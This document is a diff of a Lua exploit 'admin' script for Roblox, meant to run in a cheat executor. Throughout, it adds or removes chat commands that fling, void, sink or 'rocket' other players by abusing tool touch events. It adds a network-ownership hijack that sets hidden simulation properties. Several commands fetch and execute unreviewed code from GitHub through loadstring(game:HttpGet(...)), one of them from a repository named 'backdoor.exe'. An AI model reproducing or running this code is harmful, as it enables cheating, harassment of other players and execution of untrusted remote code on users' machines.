+	loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Leg%20Resize'))()
+end)--]]
 
-AddCommand("headrescale", {}, "resizes your head", {4}, function()
+--[[AddCommand("headrescale", {}, "resizes your head", {4}, function()
 	if game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").RigType == Enum.HumanoidRigType.R15 then
 		local Size = 6 --max size is 6
 		local SetHandleSize = true
@@ -4888,12 +4316,12 @@ AddCommand("legrescale", {}, "resizes your legs", {4}, function()
 		end
 	end
 	Utils.Notify(Caller, "Legrescale", "Rescaled!")
-end)
+end)--]]
 
 AddCommand("backdoorscan", {}, "checks if there is a backdoor in the game", {}, function()
-    wait();
-    Utils.Notify(Caller, "Backdoor", "Checking if there is a backdoor...")
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/L1ghtingBolt/FraktureSS/master/unobfuscated.lua"))()
+	wait();
+	Utils.Notify(Caller, "Backdoor", "Checking if there is a backdoor...")
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
 end)
 
 AddCommand("getmass", {}, "checks your humanoid mass", {}, function()
@@ -4903,7 +4331,7 @@ AddCommand("getmass", {}, "checks your humanoid mass", {}, function()
 end)
 
 
-AddCommand("rescale", {}, "rescales your body", {4}, function()
+--[[AddCommand("rescale", {}, "rescales your body", {4}, function()
 	local LocalPlayer = game:GetService("Players").LocalPlayer
 	local Character = LocalPlayer.Character
 	local Humanoid = Character:FindFirstChildOfClass("Humanoid")
@@ -5029,12 +4457,7 @@ AddCommand("toolhats", {}, "makes your hats holdable", {3}, function()
 			end)
 		end)
 	end
-end)
-
-AddCommand("bodybomb", {}, "makes your character bomb other players", {3}, function()
-	loadstring(game:HttpGet('https://github.com/DigitalityScripts/roblox-scripts/raw/main/loop%20fling%20all'))()
-	Utils.Notify(Caller, "Bodybomb", "Loading...")
-end)
+end)--]]
 
 AddCommand("setcreatorid", {"setcreator"}, "sets your id to the owner one", {}, function()
 	if game.CreatorType == Enum.CreatorType.User then
@@ -5050,431 +4473,6 @@ end)
 AddCommand("playerlist", {}, "enables player list", {}, function()
 	game:GetService("StarterGui"):SetCoreGuiEnabled('PlayerList', true)
 	Utils.Notify(Caller, "PlayerList", "Enabled!")
-end)
-
-AddCommand("void", {}, "voids a user", {1,"1"}, function(Caller, Args)
-	local Target = GetPlayer(Args[1]);
-	local Target2 = Args[2] and GetPlayer(Args[2]);
-	local OldPos = GetRoot(Caller).CFrame
-
-	local TempRespawnTimes = {}
-	for i = 1, #Target do
-		local v = Target[i]
-		TempRespawnTimes[v.Name] = RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name]
-	end
-	DisableAnimate();
-	ReplaceHumanoid();
-	for i, v in next, Target do
-		if (#Target == 1 and TempRespawnTimes[v.Name] and isR6(v)) then
-			Destroy(LocalPlayer.Character);
-			CWait(LocalPlayer.CharacterAdded);
-			WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos;
-			wait(.1);
-			ReplaceHumanoid();
-		end
-	end
-	local Target2Root = Target2 and GetRoot(Target2 and Target2[1] or nil);
-	for i = 1, #Target do
-		local v = Target[i]
-		if (GetCharacter(v)) then
-			if (isSat(v)) then
-				if (#Target == 1) then
-					Utils.Notify(Caller or LocalPlayer, nil, v.Name .. " is sitting down, could not bring");
-				end
-				continue
-			end
-			if (RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name] and isR6(v)) then
-				continue
-			end
-
-			local TargetRoot = GetRoot(v);
-			if (not TargetRoot) then
-				continue
-			end
-
-			local Tool = GetCorrectToolWithHandle();
-			if (not Tool) then
-				continue
-			end
-			Tool.Parent = GetCharacter();
-			Tool.Handle.Size = Vector3New(4, 4, 4);
-			CFrameTool(Tool, (Target2 and Target2Root.CFrame or OldPos) * CFrameNew(-5, 0, 0));
-			if (not syn) then
-				wait(.1);
-			end
-			for i2 = 1, 3 do
-				firetouchinterest(TargetRoot, Tool.Handle, 0);
-				wait();
-				firetouchinterest(TargetRoot, Tool.Handle, 1);
-			end
-		else
-			Utils.Notify(Caller or LocalPlayer, "Fail", v.Name .. " is dead or does not have a root part, could not bring.");
-		end
-	end
-	for i = 1, 3 do
-		GetRoot().CFrame = CFrameNew(0, Services.Workspace.FallenPartsDestroyHeight + 50, 0);
-		wait();
-	end
-	wait(.2);
-	Destroy(LocalPlayer.Character);
-	CWait(LocalPlayer.CharacterAdded);
-	WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos
-end)
-
-AddCommand("sink", {}, "sinks a player", {3,1}, function(Caller, Args)
-	local Target = GetPlayer(Args[1]);
-	local Humanoid = ReplaceHumanoid();
-	local OldPos = GetRoot(Caller).CFrame;
-	local Char = GetCharacter();
-	local tweenService, tweenInfo = game:GetService("TweenService"), TweenInfo.new(300, Enum.EasingStyle.Linear);
-
-	local TempRespawnTimes = {}
-	for i = 1, #Target do
-		local v = Target[i]
-		TempRespawnTimes[v.Name] = RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name]
-	end
-	DisableAnimate();
-	ReplaceHumanoid();
-	for i, v in next, Target do
-		if (#Target == 1 and TempRespawnTimes[v.Name] and isR6(v)) then
-			Destroy(LocalPlayer.Character);
-			CWait(LocalPlayer.CharacterAdded);
-			WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos;
-			wait(.1);
-			ReplaceHumanoid();
-		end
-	end
-	for i, v in next, Target do
-		local Tool = FindFirstChildWhichIsA(Char, "Tool") or FindFirstChildWhichIsA(LocalPlayer.Backpack, "Tool");
-		Tool.Parent = Char
-		local TargetRoot = GetRoot(v);
-		if (TargetRoot and Tool) then
-			tween = tweenService:Create(game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart, tweenInfo, {CFrame = CFrame.new(0, -1000, 0)})
-			tween:Play()
-			firetouchinterest(TargetRoot, Tool.Handle, 0);
-			firetouchinterest(TargetRoot, Tool.Handle, 1);
-		end
-		wait(.2);
-		CWait(LocalPlayer.CharacterAdded);
-		WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos
-	end
-end)
-
-AddCommand("skydive", {}, "freefalls a user", {1,"1"}, function(Caller, Args)
-	local Target = GetPlayer(Args[1]);
-	local Target2 = Args[2] and GetPlayer(Args[2]);
-	local OldPos = GetRoot(Caller).CFrame
-
-	local TempRespawnTimes = {}
-	for i = 1, #Target do
-		local v = Target[i]
-		TempRespawnTimes[v.Name] = RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name]
-	end
-	DisableAnimate();
-	ReplaceHumanoid();
-	for i, v in next, Target do
-		if (#Target == 1 and TempRespawnTimes[v.Name] and isR6(v)) then
-			Destroy(LocalPlayer.Character);
-			CWait(LocalPlayer.CharacterAdded);
-			WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos;
-			wait(.1);
-			ReplaceHumanoid();
-		end
-	end
-	local Target2Root = Target2 and GetRoot(Target2 and Target2[1] or nil);
-	for i = 1, #Target do
-		local v = Target[i]
-		if (GetCharacter(v)) then
-			if (isSat(v)) then
-				if (#Target == 1) then
-					Utils.Notify(Caller or LocalPlayer, nil, v.Name .. " is sitting down, could not bring");
-				end
-				continue
-			end
-			if (RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name] and isR6(v)) then
-				continue
-			end
-
-			local TargetRoot = GetRoot(v);
-			if (not TargetRoot) then
-				continue
-			end
-
-			local Tool = GetCorrectToolWithHandle();
-			if (not Tool) then
-				continue
-			end
-			Tool.Parent = GetCharacter();
-			Tool.Handle.Size = Vector3New(4, 4, 4);
-			CFrameTool(Tool, (Target2 and Target2Root.CFrame or OldPos) * CFrameNew(-5, 0, 0));
-			if (not syn) then
-				wait(.1);
-			end
-			for i2 = 1, 3 do
-				firetouchinterest(TargetRoot, Tool.Handle, 0);
-				wait();
-				firetouchinterest(TargetRoot, Tool.Handle, 1);
-			end
-		else
-			Utils.Notify(Caller or LocalPlayer, "Fail", v.Name .. " is dead or does not have a root part, could not bring.");
-		end
-	end
-	local Root = GetRoot();
-	local RootPos = Root.Position
-	for i = 1, 3 do
-		Root.Position = Vector3New(RootPos.X, RootPos.Y + 2000, RootPos.Z + 7);
-		wait();
-	end
-	wait(.2);
-	Destroy(LocalPlayer.Character);
-	CWait(LocalPlayer.CharacterAdded);
-	WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos
-end)
-
-AddCommand("lvoid", {}, "resize and voids a user", {1,4}, function(Caller, Args)
-	local TPlayer = getplr(Args[1]);
-	local Player = game:GetService("Players").LocalPlayer
-	local Character = Player.Character
-	local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
-	local PlayerGui = Player:WaitForChild("PlayerGui")
-	local Backpack = Player:WaitForChild("Backpack")
-	local WaitFunc = function(x) x.DescendantAdded:wait() task.wait() end	
-	local Settings = { 
-		Values = {
-			BodyTypeScale = true;
-			BodyProportionScale = true;
-			BodyWidthScale = true;
-			BodyHeightScale = true;
-			BodyDepthScale = true;
-			HeadScale = true;
-		};
-		OriginalSize = true;
-		OriginalPosition = false;
-	}
-	Character.LeftUpperLeg.LeftKneeRigAttachment:Destroy()
-	Character.LeftLowerLeg.LeftAnkleRigAttachment:Destroy()
-	Character.LeftFoot.LeftFootAttachment:Destroy()
-	for _,x in next, Settings.Values do
-		if x then
-			if Settings.OriginalSize then
-				for _, _os in next, Character:GetDescendants() do
-					if _os.Name == "OriginalSize" and _os:IsA("ValueBase") then
-						_os:Destroy()
-					end
-				end
-			end
-			if Settings.OriginalPosition then
-				for _, _op in next, Character:GetDescendants() do
-					if _op.Name == "OriginalPosition" and _op:IsA("ValueBase") then
-						_op:Destroy()
-					end
-				end
-			end
-			if Humanoid:FindFirstChild(tostring(_)) then
-				Humanoid:FindFirstChild(tostring(_)):Destroy()
-			end
-			WaitFunc(Character)
-		end
-	end
-	Humanoid:UnequipTools()
-	local MainTool = Backpack:FindFirstChildWhichIsA("Tool") or false
-	if not MainTool or not MainTool:FindFirstChild("Handle") then
-		return
-	end
-	local TCharacter = TPlayer and TPlayer.Character
-	local THumanoid = TCharacter and TCharacter:FindFirstChildWhichIsA("Humanoid") or false
-	local TRootPart = TCharacter.HumanoidRootPart
-	if not THumanoid or not TRootPart then
-		return
-	end
-
-	function hwait() return game:GetService("RunService").Heartbeat:Wait() end
-
-	Character.Humanoid.Name = "DAttach"
-	local l = Character["DAttach"]:Clone()
-	l.Parent = Character
-	l.Name = "Humanoid"
-	hwait()
-	Character["DAttach"]:Destroy()
-	game.Workspace.CurrentCamera.CameraSubject = Character
-	Character.Animate.Disabled = true
-	hwait()
-	Character.Animate.Disabled = false
-	Character.Humanoid:EquipTool(MainTool)
-	hwait()
-	local CF = Player.Character.PrimaryPart.CFrame
-	if firetouchinterest then
-		local flag = false
-		task.defer(function()
-			MainTool.Handle.AncestryChanged:wait()
-			flag = true
-		end)
-		repeat
-			firetouchinterest(MainTool.Handle, TRootPart, 0)
-			firetouchinterest(MainTool.Handle, TRootPart, 1)
-			wait(.1)
-			for i,v in pairs(Player.Character:GetChildren()) do
-				if v:IsA("BasePart") then
-					v.CFrame = CFrame.new(0,workspace.FallenPartsDestroyHeight+(1.09),0)
-				end
-			end
-		until flag
-	end                  
-	Player.CharacterAdded:Wait()
-	Player.Character.HumanoidRootPart.CFrame = CF
-end)
-
-AddCommand("rocket", {}, "rocket a user", {1,"1"}, function(Caller, Args)
-	local Target = GetPlayer(Args[1]);
-	local Target2 = Args[2] and GetPlayer(Args[2]);
-	local OldPos = GetRoot(Caller).CFrame
-
-	local TempRespawnTimes = {}
-	for i = 1, #Target do
-		local v = Target[i]
-		TempRespawnTimes[v.Name] = RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name]
-	end
-	DisableAnimate();
-	ReplaceHumanoid();
-	for i, v in next, Target do
-		if (#Target == 1 and TempRespawnTimes[v.Name] and isR6(v)) then
-			Destroy(LocalPlayer.Character);
-			CWait(LocalPlayer.CharacterAdded);
-			WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos;
-			wait(.1);
-			ReplaceHumanoid();
-		end
-	end
-	local TPlayer = getplr(Args[1]);
-	local Player = game:GetService("Players").LocalPlayer
-	local TRootPart = TPlayer.Character.HumanoidRootPart
-	local TCharacter = TPlayer.Character
-	local Character = Player.Character
-	local PlayerGui = Player:WaitForChild("PlayerGui")
-	local Backpack = Player:WaitForChild("Backpack")
-	local Humanoid = Character and Character:FindFirstChildWhichIsA("Humanoid") or false
-	local RootPart = Character and Humanoid and Humanoid.RootPart or false
-	local RightArm = Character and Character:FindFirstChild("Right Arm") or Character:FindFirstChild("RightHand")
-	if not Humanoid or not RootPart or not RightArm then
-		return
-	end
-	Humanoid:UnequipTools()
-	local MainTool = Backpack:FindFirstChildWhichIsA("Tool") or false
-	if not MainTool or not MainTool:FindFirstChild("Handle") then
-		return
-	end
-	Humanoid.Name = "DAttach"
-	local l = Character["DAttach"]:Clone()
-	l.Parent = Character
-	l.Name = "Humanoid"
-	wait()
-	Character["DAttach"]:Destroy()
-	game.Workspace.CurrentCamera.CameraSubject = Character
-	Character.Animate.Disabled = true
-	wait()
-	Character.Animate.Disabled = false
-	Character.Humanoid:EquipTool(MainTool)
-	wait()
-	Utils.Notify(Caller, "Rocket", "Sending target to space!")
-	CF = Player.Character.PrimaryPart.CFrame
-	if firetouchinterest then
-		local flag = false
-		task.defer(function()
-			MainTool.Handle.AncestryChanged:wait()
-			flag = true
-		end)
-		repeat
-			firetouchinterest(MainTool.Handle, TRootPart, 0)
-			firetouchinterest(MainTool.Handle, TRootPart, 1)
-			wait()
-			local a = Instance.new("BodyForce",Character.HumanoidRootPart)
-			a.Force = Vector3.new(0,9e3,0)
-			Character:FindFirstChildOfClass("Humanoid"):ChangeState(3)
-		until flag
-	else
-		Player.Character.HumanoidRootPart.CFrame =
-			TCharacter.HumanoidRootPart.CFrame
-		wait()
-		Player.Character.HumanoidRootPart.CFrame =
-			TCharacter.HumanoidRootPart.CFrame
-		wait()
-		local a = Instance.new("BodyForce",Character.HumanoidRootPart)
-		a.Force = Vector3.new(0,9e3,0)
-		Character:FindFirstChildOfClass("Humanoid"):ChangeState(3)
-		wait()
-	end
-	Player.CharacterAdded:wait():waitForChild("HumanoidRootPart").CFrame = CF
-end)
-
-AddCommand("punish", {}, "punish a user", {1,"1"}, function(Caller, Args)
-	local Target = GetPlayer(Args[1]);
-	local Target2 = Args[2] and GetPlayer(Args[2]);
-	local OldPos = GetRoot(Caller).CFrame
-
-	local TempRespawnTimes = {}
-	for i = 1, #Target do
-		local v = Target[i]
-		TempRespawnTimes[v.Name] = RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name]
-	end
-	DisableAnimate();
-	ReplaceHumanoid();
-	for i, v in next, Target do
-		if (#Target == 1 and TempRespawnTimes[v.Name] and isR6(v)) then
-			Destroy(LocalPlayer.Character);
-			CWait(LocalPlayer.CharacterAdded);
-			WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos;
-			wait(.1);
-			ReplaceHumanoid();
-		end
-	end
-	local Target2Root = Target2 and GetRoot(Target2 and Target2[1] or nil);
-	for i = 1, #Target do
-		local v = Target[i]
-		if (GetCharacter(v)) then
-			if (isSat(v)) then
-				if (#Target == 1) then
-					Utils.Notify(Caller or LocalPlayer, nil, v.Name .. " is sitting down, could not bring");
-				end
-				continue
-			end
-			if (RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name] and isR6(v)) then
-				continue
-			end
-
-			local TargetRoot = GetRoot(v);
-			if (not TargetRoot) then
-				continue
-			end
-
-			local Tool = GetCorrectToolWithHandle();
-			if (not Tool) then
-				continue
-			end
-			Tool.Parent = GetCharacter();
-			Tool.Handle.Size = Vector3New(4, 4, 4);
-			CFrameTool(Tool, (Target2 and Target2Root.CFrame or OldPos) * CFrameNew(-5, 0, 0));
-			if (not syn) then
-				wait(.1);
-			end
-			for i2 = 1, 3 do
-				firetouchinterest(TargetRoot, Tool.Handle, 0);
-				wait();
-				firetouchinterest(TargetRoot, Tool.Handle, 1);
-			end
-		else
-			Utils.Notify(Caller or LocalPlayer, "Fail", v.Name .. " is dead or does not have a root part, could not bring.");
-		end
-	end
-	local Root = GetRoot();
-	local RootPos = Root.Position
-	for i = 1, 3 do
-		Root.Position = Vector3New(RootPos.X + 9e9, RootPos.Y + 9e9, RootPos.Z + 9e9);
-		wait();
-	end
-	wait(.2);
-	Destroy(LocalPlayer.Character);
-	CWait(LocalPlayer.CharacterAdded);
-	WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos
 end)
 
 AddCommand("view", {}, "views a user", {3,"1"}, function(Caller, Args, CEnv)
@@ -5796,295 +4794,383 @@ AddCommand("droptools", {"dt"}, "drops all of your tools", {1,3}, function()
 	return format(("Dropped %d tool (s)"), #Tools);
 end)
 
-AddCommand("nolimbs", {}, "removes all the limbs from your character", {3}, function()
-	if game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").RigType == Enum.HumanoidRigType.R6 then
-		game.Players.LocalPlayer.Character["Left Arm"]:Destroy()
-		game.Players.LocalPlayer.Character["Right Arm"]:Destroy()
-		game.Players.LocalPlayer.Character["Left Leg"]:Destroy()
-		game.Players.LocalPlayer.Character["Right Leg"]:Destroy()
-	elseif game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").RigType == Enum.HumanoidRigType.R15 then
-		game.Players.LocalPlayer.Character["LeftUpperArm"]:Destroy()
-		game.Players.LocalPlayer.Character["RightUpperArm"]:Destroy()
-		game.Players.LocalPlayer.Character["LeftUpperLeg"]:Destroy()
-		game.Players.LocalPlayer.Character["RightUpperLeg"]:Destroy()
+AddCommand("trainhats", {}, "makes a train with all the accessories", {3}, function()
+	
+	if game:GetService("ReplicatedStorage"):FindFirstChild("RequestRespawn") then
+		game:GetService("ReplicatedStorage").RequestRespawn:Destroy()
 	end
-end)
 
-AddCommand("removerarm", {"rrarm"}, "removes right arm from your character", {3}, function()
-	if game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").RigType == Enum.HumanoidRigType.R6 then		
-		game.Players.LocalPlayer.Character["Right Arm"]:Destroy()		
-	elseif game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").RigType == Enum.HumanoidRigType.R15 then		
-		game.Players.LocalPlayer.Character["RightUpperArm"]:Destroy()		
-	end
-	Utils.Notify(Caller, "RightArm", "Removed!")
-end)
+	local Players = game:GetService("Players")
+	local RunService = game:GetService("RunService")
+	local LocalPlayer = Players.LocalPlayer
 
-AddCommand("removehats", {"nohats"}, "removes all the hats from your character", {3}, function()
-	for i,v in next, game.Players.LocalPlayer.Character:GetDescendants() do
-		if v:IsA("Accessory") then
-			for i,p in next, v:GetDescendants() do
-				if p:IsA("Weld") then
-					p:Destroy()
+	if not getgenv().Network then
+		getgenv().Network = {
+			BaseParts = {};
+			FakeConnections = {};
+			Connections = {};
+			Output = {
+				Enabled = true;
+				Prefix = "[NETWORK] ";
+				Send = function(Type,Output,BypassOutput)
+					if typeof(Type) == "function" and (Type == print or Type == warn or Type == error) and typeof(Output) == "string" and (typeof(BypassOutput) == "nil" or typeof(BypassOutput) == "boolean") then
+						if Network["Output"].Enabled or BypassOutput then
+							Type(Network["Output"].Prefix..Output);
+						end;
+					elseif Network["Output"].Enabled then
+						error(Network["Output"].Prefix.."Output Send Error : Invalid syntax.");
+					end;
+				end;
+			};
+			LostParts = {};
+			CharacterRelative = true;
+			LastCharacter = nil;
+			TryKeep = true; --loop attempts to
+			PartOwnership = {
+				PreMethodSettings = {};
+				Enabled = false;
+			};
+		}
+
+		Network["Output"].Send(print,": Loading.")
+
+		Network["RetainPart"] = function(Part,Silent,ReturnFakePart) --function for retaining ownership of unanchored parts
+			assert(Network["PartOwnership"]["Enabled"], Network["Output"].Prefix.." RetainPart Error : PartOwnership is Disabled.")
+			assert(typeof(Part) == "Instance" and Part:IsA("BasePart") and not Part:IsGrounded(),Network["Output"].Prefix.."RetainPart Error : Invalid syntax: Arg1 (Part) must be an ungrounded BasePart which is a descendant of workspace.")
+			if not Part:IsDescendantOf(workspace) then
+				Network["Output"].Send(error,"RetainPart Error : Invalid syntax: Arg1 (Part) must be an ungrounded BasePart which is a descendant of workspace.")
+				local Index = table.find(Network["LostParts"],Part)
+				if Index then
+					table.remove(Network["LostParts"],Index)
 				end
+				return false
+			end
+			assert(typeof(Silent) == "boolean" or typeof(Silent) == "nil",Network["Output"].Prefix.."RetainPart Error : Invalid syntax: Arg2 (Silent) must be a boolean or nil.")
+			assert(typeof(ReturnFakePart) == "boolean" or typeof(ReturnFakePart) == "nil",Network["Output"].Prefix.."RetainPart Error : Invalid syntax: Arg3 (ReturnFakePart) must be a boolean or nil.")
+			if not table.find(Network["BaseParts"],Part) and not table.find(Network["LostParts"],Part) then
+				table.insert(Network["BaseParts"],Part)
+				Part.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
+				if not Silent then
+					Network["Output"].Send(print,"PartOwnership Output : PartOwnership applied to BasePart "..Part:GetFullName()..".")
+				end
+				if ReturnFakePart then
+					local workspaceParts = {}
+					return FakePart
+				end
+			else
+				Network["Output"].Send(warn,"RetainPart Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it already active.")
+				return false
 			end
 		end
-	end
-	Utils.Notify(Caller, "Removehats", "Removed!")
-end)
 
-AddCommand("drophats", {}, "removes all the hats from your character", {3}, function()
-	local character = game.Players.LocalPlayer.Character
-	game.Players.LocalPlayer.Character = nil
-	game.Players.LocalPlayer.Character = character
-	wait(game.Players.RespawnTime + 0.05)
-	game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead,false)
-
-	for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-		if v.Name == "Torso" or v.Name == "UpperTorso" then
-			v:Destroy()
-		end
-	end
-	character.HumanoidRootPart:Destroy()
-	for i,v in pairs(character:GetChildren()) do
-		if v:IsA("Accessory") then
-			sethiddenproperty(v,"BackendAccoutrementState", 0) 
-		end
-	end
-	for i,v in pairs(character:GetChildren()) do
-		if v:IsA("BasePart") and v.Name ~= "Head" then
-			v:Destroy() 
-		end
-	end
-	character.Head:remove()
-	Utils.Notify(Caller, "Drophats", "Dropped!")
-end)
-
-AddCommand("throwhats", {}, "makes your hats throwable", {}, function()
-respos = nil
-player = game:GetService("Players").LocalPlayer
-mouse = player:GetMouse()
-
-while true do
-	character = player.Character
-
-	handles = {}
-	local vbreak = false
-
-	for i,v in pairs(character:GetChildren()) do
-		if v:IsA("Accessory") then
-			handles[#handles+1] = v.Handle
-			if game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").RigType == Enum.HumanoidRigType.R6 then 
-			v.Handle:FindFirstChildOfClass("SpecialMesh"):Destroy()
-			else end
-			v.Handle.AccessoryWeld:Destroy()
-			local obj = Instance.new("ObjectValue",v.Handle)
-			obj.Name = "ball"
-		end
-	end
-
-	balls = Instance.new("Folder",workspace)
-
-	ballcount = 0
-
-	mouse.Button1Up:Connect(function()
-		if vbreak == true then return end
-		ballcount += 1
-		local ballid = ballcount
-		local ball = Instance.new("Part",balls)
-		ball.Size = Vector3.new(1,1,1)
-		ball.Position = character.Head.Position + Vector3.new(0,2,0)
-		ball.CFrame = CFrame.lookAt(ball.Position,mouse.Hit.Position)
-		ball.CustomPhysicalProperties = PhysicalProperties.new(0.7,2,0.5)
-		ball.Transparency = 1
-		local obj = Instance.new("ObjectValue",ball)
-		obj.Name = "handle"
-
-		local force = Instance.new("VectorForce",ball)
-		force.Force = Vector3.new(0,math.random(50,400),-1000)
-		force.Attachment0 = Instance.new("Attachment",ball)
-		wait(.1)
-		force:Destroy()
-
-		while task.wait() do
-			if ballcount - ballid > 9 then
-				ball:Destroy()
-				break
+		Network["RemovePart"] = function(Part,Silent) --function for removing ownership of unanchored part
+			assert(typeof(Part) == "Instance" and Part:IsA("BasePart"),Network["Output"].Prefix.."RemovePart Error : Invalid syntax: Arg1 (Part) must be a BasePart.")
+			local Index1 = table.find(Network["BaseParts"],Part)
+			local Index2 = table.find(Network["LostParts"],Part)
+			if Index1 then
+				table.remove(Network["BaseParts"],Index1)
+			else
+				if not Silent then
+					Network["Output"].Send(warn,"RemovePart Warning : BasePart "..Part:GetFullName().." not found in BaseParts table.")
+				end
+				return
+			end
+			if Index2 then
+				table.remove(Network["LostParts"],Index2)
+			end
+			if not Silent then
+				Network["Output"].Send(print,"RemovePart Output: PartOwnership removed from BasePart "..Part:GetFullName()..".")
 			end
 		end
-	end)
 
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/rouxhaver/random-sh-t/main/4eye's%20net-libary%20auto%20applier.lua"))()
-
-
-	while task.wait() do
-		if vbreak == true then break end
-		for i,handle in pairs(handles) do
-			if handle.Parent == nil then
-				respos = character.HumanoidRootPart.CFrame
-				balls:Destroy()
-				vbreak = true
-				character.Humanoid.Health = 0
-				player.CharacterAppearanceLoaded:Wait()
-				break
-			end
-			if handle.ball.Value == nil or handle.ball.Value.Parent == nil then do
-					for i,ball in pairs(balls:GetChildren()) do
-						if ball.handle.Value == nil then
-							handle.ball.Value = ball
-							ball.handle.Value = handle
-							break
+		Network["PartOwnership"]["PartCoroutine"] = coroutine.create(function(Part)
+			if Part:IsDescendantOf(workspace) then
+				if Network.CharacterRelative then
+					local Character = Network["LastCharacter"];
+					if not Character.PrimaryPart then
+						for _,Inst in pairs(Character:GetDescendants()) do
+							if Inst:IsA("BasePart") then
+								Character.PrimaryPart = Inst
+								break
+							end
 						end
 					end
-					handle.Position = character.Head.Position - Vector3.new(0,5,0)
-				end else
-				handle.Position = handle.ball.Value.Position
-				handle.Orientation = handle.ball.Value.Orientation
-			end
-		end
-	end
-	player.Character.HumanoidRootPart.CFrame = respos
-end
-end)
-
-AddCommand("demeshhats", {"dhats"}, "makes your hats block", {2}, function()
-	local character = game.Players.LocalPlayer.Character
-	for _,v in pairs(character:FindFirstChildOfClass('Humanoid'):GetAccessories()) do
-		for i,c in pairs(v:GetDescendants()) do
-			if c:IsA("SpecialMesh") then
-				c:Destroy()
-			end
-		end
-	end
-	Utils.Notify(Caller, "Demeshhats", "Demeshed!")
-end)
-
-AddCommand("noface", {}, "removes your face", {3}, function()
-	local character = game.Players.LocalPlayer.Character
-	for i,v in pairs(character:GetDescendants()) do
-		if v:IsA("Decal") and v.Name == 'face' then
-			v:Destroy()
-		end
-	end
-end)
-
-AddCommand("demeshtools", {"dtools"}, "makes your tool a block", {1}, function()
-	local character = game.Players.LocalPlayer.Character
-	local Char = GetCharacter();
-	local Tools = filter(GetChildren(LocalPlayer.Backpack), function(i, Child)
-		return IsA(Child, "Tool");
-	end);
-	for i, v in next, Tools do
-		v.Parent = Char
-	end
-	for _,v in pairs(character:GetChildren()) do
-		if v:IsA("Tool") or v:IsA("HopperBin") then
-			for i,c in pairs(v:GetDescendants()) do
-				if c:IsA("SpecialMesh") then
-					c:Destroy()
+					if Character and Character.PrimaryPart then
+						local Distance = (Character.PrimaryPart.Position - Part.Position).Magnitude
+						if Distance > gethiddenproperty(LocalPlayer,"MaximumSimulationRadius") and not isnetworkowner(Part) then
+							Network["Output"].Send(warn,"PartOwnership Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it is more than "..gethiddenproperty(LocalPlayer,"MaximumSimulationRadius").." studs away.")
+							Network["RemovePart"](Part)
+							if not Part:IsGrounded() then
+								table.insert(Network["LostParts"],Part)
+							else
+								Network["Output"].Send(warn,"PartOwnership Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it is grounded.")
+							end
+						end
+					else
+						Network["Output"].Send(warn,"PartOwnership Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as the LocalPlayer Character's PrimaryPart does not exist.")
+					end
 				end
+				Part.AssemblyLinearVelocity = (Part.AssemblyLinearVelocity.Unit+Vector3.new(.01,.01,.01))*(50+math.cos(tick()*10))
+			else
+				Network["RemovePart"](Part)
+			end
+		end)
+
+		Network["PartOwnership"]["Enable"] = coroutine.create(function() --creating a thread for network stuff
+			if not Network["PartOwnership"]["Enabled"] then
+				Network["PartOwnership"]["Enabled"] = true
+				Network["PartOwnership"]["PreMethodSettings"].ReplicationFocus = LocalPlayer.ReplicationFocus
+				LocalPlayer.ReplicationFocus = workspace
+				Network["PartOwnership"]["PreMethodSettings"].SimulationRadius = gethiddenproperty(LocalPlayer,"SimulationRadius")
+				Network["PartOwnership"]["Connection"] = RunService.Stepped:Connect(function()
+					Network["LastCharacter"] = pcall(function() return LocalPlayer.Character end) or Network["LastCharacter"]
+					sethiddenproperty(LocalPlayer,"SimulationRadius",1/0)
+					coroutine.wrap(function()
+						for _,Part in pairs(Network["BaseParts"]) do --loop through parts and do network stuff
+							coroutine.resume(Network["PartOwnership"]["PartCoroutine"],Part)
+							--[==[ [[by 4eyes btw]] ]==]--
+						end
+					end)()
+					coroutine.wrap(function()
+						for _,Part in pairs(Network["LostParts"]) do
+							Network.RetainPart(Part,true)
+						end
+					end)()
+				end)
+				Network["Output"].Send(print,"PartOwnership Output : PartOwnership enabled.")
+			else
+				Network["Output"].Send(warn,"PartOwnership Output : PartOwnership already enabled.")
+			end
+		end)
+
+		Network["PartOwnership"]["Disable"] = coroutine.create(function()
+			if Network["PartOwnership"]["Connection"] then
+				Network["PartOwnership"]["Connection"]:Disconnect()
+				LocalPlayer.ReplicationFocus = Network["PartOwnership"]["PreMethodSettings"].ReplicationFocus
+				sethiddenproperty(LocalPlayer,"SimulationRadius",Network["PartOwnership"]["PreMethodSettings"].SimulationRadius)
